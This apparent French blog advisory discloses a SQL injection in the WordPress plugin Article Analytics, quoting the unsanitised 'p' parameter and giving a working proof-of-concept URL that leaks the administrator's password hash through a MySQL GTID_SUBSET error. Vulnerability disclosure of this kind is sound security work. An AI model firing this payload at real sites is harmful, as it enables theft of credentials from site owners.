---
title: "Injection SQL dans le plugin Wordpress Article Analytics"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Article Analytics](https://wordpress.org/plugins/article-analytics/) a la description suivante :

> Article analytics provides digital analytics of the visitors who read your posts.
> The following parameters can be configured:
> 
> 1) Analysis period
>  
> 2) Type of audience (all visits, authenticated visits, anonymous visits)
> 
> 3) Include owner visits for statistics;

Ce plugin est en version 1.0 et la dernière activité date d'il y a 9 ans déjà.

## La vulnérabilité

Étonnement personne ne semble avoir remarqué la vulnérabilité jusqu'à présent.

Dans `article-analytics.php`, l'auteur hooke la fonction `pre_get_posts` de Wordpress :

```php
add_filter('pre_get_posts', 'article_analytics_visit_article');
```

La fonction `article_analytics_visit_article` est alors appelée avant le fonctionnement normal de wordpress.

D'après [la documentation](https://developer.wordpress.org/reference/hooks/pre_get_posts/) :

> Fires after the query variable object is created, but before the actual query is run.

```php
function article_analytics_visit_article($wp_query) {
    $query = $wp_query->query;
    $post_id = (isset($query['p'])) ? $query['p'] : NULL;

    if (!$post_id) {
        return;
    }
    global $wpdb;
    $current_user_id = get_current_user_id();
    $sql = "INSERT INTO " . WP_ARTICLE_ANALITICS_TABLE . " SET user_id=" . $current_user_id . ", post_id=" . $post_id;
    $result = $wpdb->get_results($sql);
}
```

La variable `$post_id` (paramètre `p` de l'URL) n'est pas suffisamment vérifiée et permet l'injection de code SQL.

Le PoC suivant permet d'extraire le hash du premier utilisateur du Wordpress (l'administrateur) :

`http://localhost:8000/?p=1%20AND%20GTID_SUBSET%28CONCAT%280x686173683a%2C%28SELECT%20user_pass%20FROM%20%60wordpress%60.wp_users%20ORDER%20BY%20ID%20LIMIT%201%2C1%29%29%2C4001%29`

Il en résulte la requête SQL suivante :

```sql
INSERT INTO wp_article_analytics_info SET user_id=0, post_id=1 AND GTID_SUBSET(CONCAT(0x686173683a,(SELECT user_pass FROM `wordpress`.wp_users ORDER BY ID LIMIT 1,1)),4001)
```

L'utilisation de la fonction MySQL [GTID_SUBSET](https://dev.mysql.com/doc/refman/8.0/en/gtid-functions.html#function_gtid-subset) permet l'exfiltration du hash via une erreur Wordpress :

`WordPress database error: [Malformed GTID set specification 'hash:$P$BLGng0fIZc6vbUELsDJDRKpYO9Jb/e0'.]`

